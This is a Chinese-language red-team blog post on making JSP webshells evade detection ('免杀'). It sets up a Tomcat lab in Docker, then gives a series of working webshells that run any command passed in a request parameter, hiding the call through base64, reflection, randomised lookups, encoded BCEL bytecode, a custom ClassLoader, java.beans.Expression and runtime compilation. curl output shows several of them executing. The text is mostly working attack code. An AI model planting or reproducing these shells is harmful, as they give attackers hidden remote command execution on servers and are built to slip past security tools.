---
title: jsp免杀
date: 2022-01-10 10:15:52
categories: 红队技术
tags:
- 免杀
---

> 知人者智，自知者明。

jsp免杀学习。主要参考少许电华师傅的视频和文章，以及其他师傅的文章做参考。

<!-- more -->



## 1. JSP浅析

整个JSP的内容实际上是一个HTML，但是稍有不同：

- 包含在`<%--`和`--%>`之间的是JSP的注释，它们会被完全忽略；
- 包含在`<%`和`%>`之间的是Java代码，可以编写任意Java代码；
- 如果使用`<%= xxx %>`则可以快捷输出一个变量的值。

JSP页面内置了几个变量：

- out：表示HttpServletResponse的PrintWriter；
- session：表示当前HttpSession对象；
- request：表示HttpServletRequest对象。

这几个变量可以直接使用。



## 2. 构建webshell测试环境

在主机上创建tomcat目录：

```
mkdir -p /usr/local/tomcat/webapps
```

是用docker构建tomcat:

```
docker run -d -p 8081:8080 -v /usr/local/tomcat/webapps:/usr/local/tomcat/webapps --name mytomcat tomcat
```

创建一个tomcat app

```
mkdir -p /usr/local/tomcat/webapps/webshell
```

编写一个最简单的jsp webshell:

jspshell0.jsp:

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<body>
<%
    Runtime runtime = Runtime.getRuntime();
    String cmd = request.getParameter("cmd");
    Process process = runtime.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
</body>
</html>

```

将这个webshell放到docker映射的tomcat web主机目录上。

```bash
[shadowflow@ShadowOS /tmp]% scp jspshell0.jsp debian:/usr/local/tomcat/webapps/webshell/
jspshell0.jsp                                           100%  626     1.1MB/s   00:00
```

然后访问访问。

```bash
[shadowflow@ShadowOS /tmp]% curl http://172.16.42.150:8081/webshell/jspshell0.jsp?cmd=whoami

<pre>root
</pre>%
```



## 3. 最简单的马测试



```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<body>
<%
    Runtime runtime = Runtime.getRuntime();
    String cmd = request.getParameter("cmd");
    Process process = runtime.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
</body>
</html>



```

如上jsp代码，`<%@ page ... %>` 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等，body标签里面先获取Runtime对象。request是JSP内置变量，表示HttpServletRequest对象，通过request拿到url请求中的cmd变量，然后通过Runtime对象调用exec方法执行cmd参数传递的指令。然后将执行的结果传入InputStream，然后打印出结果。



## 4. base64马



```jsp
<%@ page import="java.util.Base64" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<body>
<%
    Runtime runtime = Runtime.getRuntime();
    String cmdx = request.getParameter("cmd");
    byte[] decodedBytes = Base64.getDecoder().decode(cmdx);
    String cmd = new String(decodedBytes);
    Process process = runtime.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
</body>
</html>
```

`http://172.16.42.151:8081/aa.jsp?cmd=aWQ=`

注意参数必须是base64格式，不然会报错





## 5. 反射方式



```jsp
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // 加入一个密码
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
    // 反射调用
    Class rt = Class.forName("java.lang.Runtime");
    java.lang.reflect.Method gr = rt.getMethod("getRuntime");
    java.lang.reflect.Method ex = rt.getMethod("exec", String.class);
    Process process = (Process) ex.invoke(gr.invoke(null), cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
```



```bash
[shadowflow@ShadowOS ~]% curl http://localhost:8080/jspshell/jsp1.jsp?cmd=id&pwd=password

<pre>uid=501(shadowflow) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
</pre>%
```



## 6. 利用随机数运行时可知字符串绕过

```jsp
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<%@ page import="java.util.Random" %>
<html>
<body>
<%
    String s2 = request.getParameter("cmd");
    Class rt;
    while (true) {
        try {
            rt = Class.forName("java.lang." + (new String(Character.toChars(new Random().nextInt(3) + 80))) + "untime");
            break;
        } catch (Throwable throwable) {}
    }
    Field currentRuntime = rt.getDeclaredFields()[0];
    currentRuntime.setAccessible(true);
    Object o = currentRuntime.get(null);
    Process process;
    while (true) {
        try {
            Method method = rt.getDeclaredMethods()[new Random().nextInt(20)];
            method.setAccessible(true);
            process = (Process) MethodUtil.invoke(method, o, new Object[]{s2.split(" ")});
            if (process ==  null)
                continue;
            break;
        } catch (Throwable throwable) {}
    }
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    out.print("<pre>");
    String s = null;
    while ((s = bufferedReader.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
</body>
</html>
```

利用：

```
[shadowflow@ShadowOS ~]% curl http://localhost:8080/jspshell/jsp2.jsp?cmd=whoami

<html>
<body>
<pre>shadowflow
</pre>
</body>
</html>%
```



## 7. BCEL字节码的JSP

BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于`com.sun.org.apache.bcel`。

==在Java 8u251以后,BCEL不再适用。==我们在构建环境的时候tomcat运行环境的java必须要低于此版本才能成功。

先编写一个exp

exp.java:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Exp {
    String res;
    public Exp(String cmd) throws Exception{
        StringBuilder stringBuilder = new StringBuilder();
        Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line=reader.readLine())!=null){
            stringBuilder.append(line).append("\n");
        }
       this.res = stringBuilder.toString();
    }
    @Override
    public String toString() {
        return res;
    }
}

```

再在同一个目录下编写一个程序将exp.java转为字节码

Util.java:

```
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Util {
    public static void main(String[] args) throws Exception {
        URI uri = Util.class.getResource("Exp.class").toURI();
        byte[] bytes = Files.readAllBytes(Paths.get(uri));
        String bcel = Utility.encode(bytes, true);
        System.out.println("$$BCEL$$" + bcel);
    }
}

```

`$$BCEL$$`开头的字节码在被bcel类加载的时候会执行字节码。

运行Util.java

```
$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbR$TA$Q$3d$93l2aY$I$84$A$c1$bbx$n$84$84xAQ$40P$Q$U$N$c1$C$L$w$8f$cbf$c0$c5d7$b5$d9X$fc$91$afZ$a5$89$rU$3e$fa$e0G$f8$B$7e$83$r$f6l$WB$8aX$3el$cft$9fN$f7$e9$93$9e$l$7f$be$7e$Dp$Xy$V$fdHsdT$E$90V1$89$ac4$b78ns$dcQ$vcJ$F$c7$3d$Va$dc$97fZ$s$3e$88$e0$a1$3cg$ba$d0$87Y$8e9$8eG$MAGT$Zb$b9$7d$fd$9d$9e$z$e9$d6$5ev$d3uLko$96$n$3cgZ$a6$3b$cf0$98$3c$L$8fo1$uKvQ0Ds$a6$r$f2$b5$f2$8ep$5e$eb$3b$r$n$cb$d9$86$5e$da$d2$jS$fa$7ePq$df$98$d4$w$94$5b$3e$a8P$f5$a0Q$$2$f4T$bdr$8b5$b3T$U$O$c3$c8$99N$3e$q$f98B$f7$92$S$cd$q$d3$ce$$$d6vw$85$p$8a$h$kB9J$89$b8P$d9MW7$de$ae$e9$V$af$b77$eb$3c$e9E$C1$a8$cb$H$86$a8$b8$a6mU9$W$Y$o$ae$dd$ec$c4$QO$8ew$SB$dd$b4k$8e$nVL9F$84$e8O$ca$q$Nq$3cf$Y$fe$Ha$8e$t$g$W$b1$a4$e1$v$96$Z$86$3aS$a6$89$8f$81U$abRs$a9$84$d0$cbM$8ccE$c33$3c$97$8dV$a5y$a1$e1$r$c65$e4$b0$c6$c0T$NI$e9$c50$40j$S$x$86$be$W$97$f5$9d$7da$b8m$a1$e3$v$HZ$a1$T$v$a8BR$fe$a5$fd$zl$a3f$b9f$99$sV$f7$84$7b$e2$M$b6I$e4$87$a5$f0$e2$40$Y$Mc$9dV$e5T$e8$95c$h$a2Z$9dm$eb$e4$H$Zz$a9$d3$v$ZH$dc$e3n$ed$fa$d0$cf$T$c9$8e$80$9ca$a0$F$f9$7b$n$a3$R$b9$3d9o$3b$c2z$a5$o$y$da$be$cc$7f$d8$b6o$m$ae$d2$c3$e9$a7$X$c8$e8$p$d5$c9$G$e8$k$c7$m$9dC$e4$fd$a4$a7$W$a2s$3d$d5$A$3bD$a0$d0$40p$ed$L$94$89$3aB$db$87$I$X$O$c1$L$be_G$a4$81$ae$G$d4$7c$a6$8e$ee$c2$8c$f2$j$b1$f4$88R$87$W$eb$n$b3$fd$fe$e8W$w$5dG$efgD$3fR$c9$m$86$c9$8e$oB6$M$85$5e$b7F$f78$ba$90A7$a6$c9$5bA$_$f2$88$oA$ZSM$g$Y$c19$c0$bb$9d$t$ba$8c$b2$96p$B$X$89n$86j$5d$c2e$aa$3bE$d8$VB$V$g$Pt$P$i$R$a8p$8cr$5c$e3$b8$ceq$D$f8$8d$Ey$b8I$J$K$95$Z$a3$8fV$8f$ac$9c$3aK$a7T$q$94$fa$84$e8$HO$94a$8feS$s$c9Gk$s$f8$7c$YR$5e$d6$c4_$L$ea$8b$87$d1$E$A$A

```

将运行的结果插入jsp

bcel.jsp

```jsp
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>


<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String cmd = request.getParameter("cmd");
    String bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbR$TA$Q$3d$93l2aY$I$84$A$c1$bbx$n$84$84xAQ$40P$Q$U$N$c1$C$L$w$8f$cbf$c0$c5d7$b5$d9X$fc$91$afZ$a5$89$rU$3e$fa$e0G$f8$B$7e$83$r$f6l$WB$8aX$3el$cft$9fN$f7$e9$93$9e$l$7f$be$7e$Dp$Xy$V$fdHsdT$E$90V1$89$ac4$b78ns$dcQ$vcJ$F$c7$3d$Va$dc$97fZ$s$3e$88$e0$a1$3cg$ba$d0$87Y$8e9$8eG$MAGT$Zb$b9$7d$fd$9d$9e$z$e9$d6$5ev$d3uLko$96$n$3cgZ$a6$3b$cf0$98$3c$L$8fo1$uKvQ0Ds$a6$r$f2$b5$f2$8ep$5e$eb$3b$r$n$cb$d9$86$5e$da$d2$jS$fa$7ePq$df$98$d4$w$94$5b$3e$a8P$f5$a0Q$$2$f4T$bdr$8b5$b3T$U$O$c3$c8$99N$3e$q$f98B$f7$92$S$cd$q$d3$ce$$$d6vw$85$p$8a$h$kB9J$89$b8P$d9MW7$de$ae$e9$V$af$b77$eb$3c$e9E$C1$a8$cb$H$86$a8$b8$a6mU9$W$Y$o$ae$dd$ec$c4$QO$8ew$SB$dd$b4k$8e$nVL9F$84$e8O$ca$q$Nq$3cf$Y$fe$Ha$8e$t$g$W$b1$a4$e1$v$96$Z$86$3aS$a6$89$8f$81U$abRs$a9$84$d0$cbM$8ccE$c33$3c$97$8dV$a5y$a1$e1$r$c65$e4$b0$c6$c0T$NI$e9$c50$40j$S$x$86$be$W$97$f5$9d$7da$b8m$a1$e3$v$HZ$a1$T$v$a8BR$fe$a5$fd$zl$a3f$b9f$99$sV$f7$84$7b$e2$M$b6I$e4$87$a5$f0$e2$40$Y$Mc$9dV$e5T$e8$95c$h$a2Z$9dm$eb$e4$H$Zz$a9$d3$v$ZH$dc$e3n$ed$fa$d0$cf$T$c9$8e$80$9ca$a0$F$f9$7b$n$a3$R$b9$3d9o$3b$c2z$a5$o$y$da$be$cc$7f$d8$b6o$m$ae$d2$c3$e9$a7$X$c8$e8$p$d5$c9$G$e8$k$c7$m$9dC$e4$fd$a4$a7$W$a2s$3d$d5$A$3bD$a0$d0$40p$ed$L$94$89$3aB$db$87$I$X$O$c1$L$be_G$a4$81$ae$G$d4$7c$a6$8e$ee$c2$8c$f2$j$b1$f4$88R$87$W$eb$n$b3$fd$fe$e8W$w$5dG$efgD$3fR$c9$m$86$c9$8e$oB6$M$85$5e$b7F$f78$ba$90A7$a6$c9$5bA$_$f2$88$oA$ZSM$g$Y$c19$c0$bb$9d$t$ba$8c$b2$96p$B$X$89n$86j$5d$c2e$aa$3bE$d8$VB$V$g$Pt$P$i$R$a8p$8cr$5c$e3$b8$ceq$D$f8$8d$Ey$b8I$J$K$95$Z$a3$8fV$8f$ac$9c$3aK$a7T$q$94$fa$84$e8$HO$94a$8feS$s$c9Gk$s$f8$7c$YR$5e$d6$c4_$L$ea$8b$87$d1$E$A$A";
    Class<?> _loader = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    ClassLoader loader = (ClassLoader) _loader.newInstance();
    Class<?> _obj = loader.loadClass(bcel);
    Constructor<?> constructor = _obj.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
    response.getWriter().print("<pre>");
    response.getWriter().print(obj.toString());
    response.getWriter().print("</pre>");
%>

```

```
[shadowflow@ShadowOS /tmp]% curl http://localhost:8080/jspshell_war/bcel.jsp?cmd=whoami
<pre>shadowflow
</pre>
```

执行成功









## 8. 自定义ClassLoader

自定义ClassLoader的方式和BCEL的方式是类似的，只是BCEL是转换成BCEL字节码，而ClassLoader是转为真正的字节码

exp.java不变

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Exp {
    String res;
    public Exp(String cmd) throws Exception{
        StringBuilder stringBuilder = new StringBuilder();
        Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line=reader.readLine())!=null){
            stringBuilder.append(line).append("\n");
        }
       this.res = stringBuilder.toString();
    }
    @Override
    public String toString() {
        return res;
    }
}

```

Util.java，将Exp转为字节码

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Util {
    public static void main(String[] args) throws Exception {
        URI uri = Util.class.getResource("Exp.class").toURI();
        byte[] codeBytes = Files.readAllBytes(Paths.get(uri));
        String base = Base64.getEncoder().encodeToString(codeBytes);
        System.out.println(base);
    }
}

```

运行：

```
/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/bin/java -javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=63386:/Applications/IntelliJ IDEA.app/Contents/bin -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/cldrdata.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/jaccess.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/nashorn.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/jfxswt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/rt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/ant-javafx.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/dt.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/javafx-mx.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/jconsole.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/packager.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/sa-jdi.jar:/Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/lib/tools.jar:/Users/shadowflow/code/java/sec/target/classes Util
objc[13083]: Class JavaLaunchHelper is implemented in both /Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/bin/java (0x10ae674c0) and /Library/Java/JavaVirtualMachines/jdk1.8.0_101.jdk/Contents/Home/jre/lib/libinstrument.dylib (0x10aee14e0). One of the two will be used. Which one is undefined.
yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr

Process finished with exit code 0

```

将结果复制出来，==复制的时候不要双击复制，这样复制不全==

插入classloader.jsp

```jsp
<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%
    String cmd = request.getParameter("cmd");
    ClassLoader classLoader = new ClassLoader() {
        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if(name.contains("Exp")){
                return findClass(name);
            }
            return super.loadClass(name);
        }
        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException{
            byte[] code = Base64.getDecoder().decode("yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr");
            return this.defineClass(name, code, 0, code.length);
        }
    };
    Class<?> clazz = classLoader.loadClass("Exp");
    Constructor<?> con = clazz.getConstructor(String.class);
    String result = con.newInstance(cmd).toString();
    response.getWriter().println("<pre>");
    response.getWriter().println(result);
    response.getWriter().println("</pre>");

%>
</body>
</html>

```

```
[shadowflow@ShadowOS /tmp]% curl http://localhost:8080/jspshell_war/classloader.jsp?cmd=whoami
<pre>
shadowflow

</pre>
```



## 9. BeansExpression

通过`java.beans.Expression`来执行`getRuntime()`

```java
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.beans.Expression" %>
<%@ page import="java.io.InputStream" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String cmd = request.getParameter("cmd");
    Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});
    Process process = (Process) expr.getValue();
    InputStream in = process.getInputStream();

    StringBuilder sb = new StringBuilder();
    InputStreamReader resultReader = new InputStreamReader(in);
    BufferedReader stdInput = new BufferedReader(resultReader);
    String s = null;
    while ((s=stdInput.readLine()) != null) {
        sb.append(s).append("\n");
    }
    response.getWriter().print(sb.toString());
%>

```





## 10. 动态编译



```java
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="javax.tools.JavaCompiler" %>
<%@ page import="javax.tools.ToolProvider" %>
<%@ page import="javax.tools.DiagnosticCollector" %>
<%@ page import="java.util.Locale" %>
<%@ page import="java.nio.charset.Charset" %>
<%@ page import="javax.tools.StandardJavaFileManager" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.lang.reflect.Constructor" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String cmd = request.getParameter("cmd");
    String tmpPath = Files.createTempDirectory("xxxooo").toFile().getPath();
    String code = "import java.io.BufferedReader;\n" +
            "import java.io.InputStreamReader;\n" +
            "\n" +
            "public class Exp {\n" +
            "    String res;\n" +
            "    public Exp(String cmd) throws Exception{\n" +
            "        StringBuilder stringBuilder = new StringBuilder();\n" +
            "        Runtime.getRuntime().exec(cmd);\n" +
            "        BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        String line;\n" +
            "        while((line=reader.readLine())!=null){\n" +
            "            stringBuilder.append(line).append(\"\\n\");\n" +
            "        }\n" +
            "       this.res = stringBuilder.toString();\n" +
            "    }\n" +
            "    @Override\n" +
            "    public String toString() {\n" +
            "        return res;\n" +
            "    }\n" +
            "}\n";

    Files.write(Paths.get(tmpPath + File.separator + "Exp.java"), code.getBytes(StandardCharsets.UTF_8));
    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
    DiagnosticCollector diagnosticCollector = new DiagnosticCollector();
    StandardJavaFileManager standardJavaFileManager = javaCompiler.getStandardFileManager(diagnosticCollector, Locale.CHINA, Charset.forName("UTF-8"));
    Iterable fileObjects = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "Exp.java");
    javaCompiler.getTask(null, standardJavaFileManager, diagnosticCollector, null, null, fileObjects).call();

    URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)});
    Class<?> clazz = classLoader.loadClass("Exp");
    Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);

    response.getWriter().println(obj);
%>


```



```
